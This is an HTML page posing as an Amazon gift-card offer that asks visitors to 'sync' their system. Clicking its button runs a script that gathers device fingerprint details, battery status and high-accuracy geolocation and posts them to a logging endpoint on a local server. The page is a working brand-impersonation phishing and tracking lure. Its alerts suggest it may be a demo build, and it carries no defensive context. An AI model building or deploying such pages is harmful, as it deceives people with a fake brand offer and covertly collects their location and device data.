<!DOCTYPE html>
<html>
<head>
    <title>Amazon Rewards & System Sync</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Arial', sans-serif; text-align: center; background-color: #f3f3f3; padding-top: 50px; }
        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; width: 90%; max-width: 400px; }
        .amazon-logo { width: 120px; margin-bottom: 20px; }
        .btn { background-color: #febd69; border: 1px solid #a88734; color: #111; padding: 12px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; }
        .btn:hover { background-color: #f3a847; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="amazon-logo">
    <h3>Exclusive Offer Found!</h3>
    <p>Please sync your system services to claim your ₹500 Amazon Gift Card.</p>
    <button id="openBoth" class="btn">Claim & Sync Now</button>
</div>

<script>
const serverURL = "http://localhost:3000"; // Local server

function sendData(data) {
    fetch(`${serverURL}/log-info`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    });
}

document.getElementById("openBoth").addEventListener("click", () => {

    // 🔁 Device info
    const data = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages || [],
        online: navigator.onLine,
        ram: navigator.deviceMemory || "NA",
        cpuCores: navigator.hardwareConcurrency || "NA",
        screenRes: screen.width + "x" + screen.height,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        batteryLevel: 0,
        isCharging: false,
        latitude: null,
        longitude: null
    };

    // 🔋 Battery info
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            data.batteryLevel = Math.round(battery.level * 100);
            data.isCharging = battery.charging;
            sendData(data);
        });
    }

    // 🌐 Geolocation
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                data.latitude = pos.coords.latitude;
                data.longitude = pos.coords.longitude;
                sendData(data);
                alert("Data sent! Check server console.");
            },
            err => {
                sendData(data);
                alert("Location permission denied. Only device info sent.");
            },
            { enableHighAccuracy: true }
        );
    } else {
        sendData(data);
        alert("Geolocation not supported. Only device info sent.");
    }

});
</script>

</body>
</html>
